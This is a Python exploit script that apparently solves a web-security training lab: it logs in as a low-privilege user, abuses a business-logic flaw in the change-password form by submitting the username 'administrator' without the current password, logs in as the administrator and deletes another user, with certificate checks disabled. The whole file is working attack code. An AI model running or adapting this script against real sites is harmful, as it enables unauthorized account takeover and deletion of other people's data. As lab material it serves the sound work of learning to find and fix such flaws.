import requests
import sys
import urllib3
from bs4 import BeautifulSoup 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

def get_csrf_token(session, url) :
    res = session.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf_token = soup.find('input', {'name':'csrf'})['value']
    return csrf_token

def business_logic_exploit(session, url) :
    login_url = url + '/login'
    csrf_token =  get_csrf_token(session, login_url)
    data = {'csrf':csrf_token, 'username':'wiener', 'password':'peter'}
    res = session.post(login_url, data=data, verify=False, proxies=proxies)
    
    if "Log out" in res.text :
        change_password = url + '/my-account/change-password'
        token_url = url + '/my-account?id=wiener'
        csrf_token = get_csrf_token(session, token_url)
        data = {'csrf':csrf_token, 'username':'administrator','new-password-1':'test','new-password-2':'test'}
        r = session.post(change_password, data=data, proxies=proxies, verify=False)
        
        if 'Password changed successfully!' in r.text :
            csrf_token =  get_csrf_token(session, login_url)
            data = {'csrf':csrf_token, 'username':'administrator', 'password':'test'}
            res = session.post(login_url, data=data, verify=False, proxies=proxies)
            
            if "Log out" in res.text :
                print("Successfully logged in as the administrator!")
                delete_url = url + '/admin/delete?username=carlos'
                response = session.get(delete_url, verify=False, proxies=proxies)
                
                if 'User deleted successfully!' in response.text :
                    print("The lab has been solved successfully!")
                else :
                    print("Failed to solve the lab!")
            else :
                print("Could not log in as the administrator!")
        else :
            print('Could not change the password!')

if __name__ == "__main__" :
    try :
        url = sys.argv[1]
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    session = requests.Session()
    business_logic_exploit(session, url)